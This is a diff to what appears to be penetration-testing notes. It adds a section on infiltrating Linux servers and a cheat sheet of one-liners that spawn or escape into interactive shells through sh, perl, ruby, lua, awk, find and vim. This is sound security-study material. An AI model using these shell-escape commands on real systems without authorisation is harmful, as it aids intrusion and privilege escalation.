@@ -155,6 +155,53 @@ linux/zarch/meterpreter_reverse_tcp
   4. MSF 
 
   5. ftp, tftp, http/s 
+```
+
+<br>
+
+### Infiltrating Unix/linux
+```
+# W3Techs OS Usage Study 
+  1. Almost 90% of Webservers utilize a unix/linux system 
+  2. https://w3techs.com/technologies/overview/operating_system
+
+# Shell consideration for linux 
+  1. linux distro 
+  2. what shell and languages exist on the system 
+  3. what function does the system server (This implies a lot)
+  4. Known vulnerabilities
 
 
+```
+
+
+<br>
+
+### Spawning Interactive Shells 
+```
+# Using /bin/sh
+  1. /bin/sh -i 
+
+# Perl
+  2. perl —e 'exec "/bin/sh";'
+    - perl: exec "/bin/sh";
+
+# Ruby 
+  3. ruby: exec "/bin/sh"
+
+# Lua 
+  4. lua: os.execute('/bin/sh')
+
+# AWK 
+  5. awk 'BEGIN {system("/bin/sh")}'
+
+# Find 
+  6. find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
+  7. find . -exec /bin/sh \; -quit
+
+# VIM
+  8. vim -c ':!/bin/sh'
+  9. vim
+    :set shell=/bin/sh
+    :shell
 ```
